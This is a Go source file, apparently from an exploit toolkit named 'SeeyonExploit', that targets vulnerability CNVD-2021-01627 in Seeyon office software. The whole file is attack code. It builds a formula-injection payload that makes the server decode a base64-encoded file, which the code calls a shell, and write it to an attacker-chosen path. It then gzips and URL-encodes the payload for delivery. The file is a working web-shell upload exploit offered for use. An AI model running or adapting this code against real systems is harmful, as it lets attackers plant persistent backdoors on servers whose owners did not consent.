package CNVD202101627

import (
	"SeeyonExploit/utils"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"golang.org/x/text/encoding/charmap"
	"io/ioutil"
	"net/url"
	"os"
)

type Conf struct {
	Enc  string
	Name string
	Path string
}

func render(enc string, name string, path string) string {
	conf := Conf{enc, name, path}
	payload := `
[{'formulaType': 1, 'formulaName': 'test', 'formulaExpression': 'String path = "{{.Path}}";
       	java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"{{.Name}}");
        String shell = "{{.Enc}}"
        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
        String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");
        printWriter2.println(decodeString);
        printWriter2.close();};test();def static xxx(){'}, '', {}, 'true']
`
	return utils.Render(conf, payload)
}

func GeneratePayload(file string, name string, path string) string {
	fil, err := os.Open(file)
	utils.PanicErr(err)
	defer fil.Close()
	content, err := ioutil.ReadAll(fil)
	enc := string(content)

	enc = base64.StdEncoding.EncodeToString([]byte(enc))
	data := render(enc, name, path)
	var in bytes.Buffer
	w := gzip.NewWriter(&in)
	w.Write([]byte(data))
	w.Close()
	//fmt.Println(in.String())
	dec, err := charmap.ISO8859_1.NewDecoder().String(in.String())
	utils.PanicErr(err)
	escape := url.QueryEscape(dec)
	return escape
}
